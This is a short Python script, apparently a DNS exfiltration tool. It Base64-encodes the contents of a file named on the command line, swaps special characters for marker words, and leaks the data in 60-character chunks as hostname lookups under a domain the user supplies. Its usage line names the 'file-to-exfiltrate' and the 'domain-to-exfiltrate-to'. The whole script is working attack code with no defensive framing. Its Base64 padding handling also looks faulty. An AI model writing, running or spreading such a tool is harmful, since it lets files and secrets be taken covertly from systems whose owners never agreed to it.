#!/usr/bin/python3
import socket
import sys

class Base64(object):
    characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"

    def chunk(self, data, length):
        return [data[i:i+length] for i in range(0, len(data), length)]

    def encode(self, data):
        override = 0
        if len(data) % 3 != 0:
            override = (len(data) + 3 - len(data) % 3) - len(data)
        data += b"\x00"*override

        threechunks = self.chunk(data, 3)

        binstring = ""
        for chunk in threechunks:
            for x in chunk:
                binstring += "{:0>8}".format(bin(x)[2:])

        sixchunks = self.chunk(binstring, 6)

        outstring = ""
        for element in sixchunks:
            outstring += self.characters[int(element, 2)]
        
        outstring = outstring[:-override] + "="*override
        return outstring

    def decode(self, data):
        override = data.count("=")
        data = data.replace("=", "A")
        
        binstring = ""
        for char in data:
            binstring += "{:0>6b}".format(self.characters.index(char))

        eightchunks = self.chunk(binstring, 8)
        
        outbytes = b""
        for chunk in eightchunks:
            outbytes += bytes([int(chunk, 2)])

        return outbytes[:-override]


def main(file, domain):
	handle = open(file, "r")
	data = handle.read().strip().encode()
	b64 = Base64()
	data = b64.encode(data)
	data = data.replace("+", "PlUsSiGn").replace("/", "FoRwArDsLaSh").replace("=", "EqUaLsIgN")
	ptr = 0
	chunk = ""

	for i in range(len(data)):
		if ptr % 60 == 0 and ptr != 0:
			socket.getaddrinfo(f"{chunk}.{domain}", 80)
			chunk = ""
		chunk += data[i]
		ptr += 1
	socket.getaddrinfo(f"{chunk}.{domain}", 80)
	handle.close()

if __name__ == "__main__":
	if len(sys.argv) == 3:
		main(sys.argv[1], sys.argv[2])
	else:
		print("usage: <file-to-exfiltrate> <domain-to-exfiltrate-to>")